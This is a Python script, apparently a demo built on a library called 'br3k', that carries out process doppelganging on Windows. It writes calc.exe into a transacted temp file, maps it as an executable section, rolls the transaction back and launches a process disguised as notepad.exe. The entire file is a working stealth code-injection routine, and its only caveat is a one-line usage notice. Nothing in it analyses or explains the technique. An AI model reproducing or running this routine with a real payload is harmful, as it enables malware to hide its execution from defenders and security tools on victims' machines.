# =============================================================================
# IMPORTANT USAGE NOTICE
# 1. Use only for authorized, non-malicious education, research, and testing.
# =============================================================================

import br3k

ORIGINAL_IMAGE_FILEPATH = "C:\\Windows\\notepad.exe"
INJECTED_IMAGE_FILEPATH = "C:\\Windows\\System32\\calc.exe"

if __name__ == "__main__":

    print("Script: Inject via process doppelganging")
    print()

    br3k.sysapi.init()

    temp_image_path = br3k.fs.get_temp_path("br3k_doppel_image.exe")
    injected_image = br3k.fs.FileMapping(INJECTED_IMAGE_FILEPATH)

    tx = br3k.tx.Transaction("TH")
    tx.create()

    tx.set()
    handle = br3k.fs.create_file(temp_image_path, file_mode=br3k.fs.FileMode.ReadWrite)
    tx.unset()

    br3k.fs.write_file(handle, data=injected_image.data, size=injected_image.size)
    del handle

    tx.set()
    handle = br3k.fs.open_file(temp_image_path)
    tx.unset()

    section_handle = br3k.fs.create_file_section(handle, sect_mode=br3k.fs.SectionMode.Execute)
    del handle

    tx.rollback()

    process = br3k.proc.Process(
        section_handle=section_handle,
        process_vm_write_strategy=br3k.proc.ProcessVmWriteStrategy.AllocateInAddr
    )

    process.create()

    proc_params = br3k.proc.ProcessParameters(filepath=ORIGINAL_IMAGE_FILEPATH)
    basic_info = process.get_basic_info()

    process.init_memory()
    process.write_peb_proc_params(basic_info.PebBaseAddress, proc_params)

    injected_pe = br3k.pe.native.PtrImage(
        data=injected_image.data,
        size=injected_image.size,
        is_file = True
    )

    peb = process.read_peb()
    thread = br3k.proc.Thread(process)
    thread.create(ep=peb.ImageBaseAddress + injected_pe.ep_address())
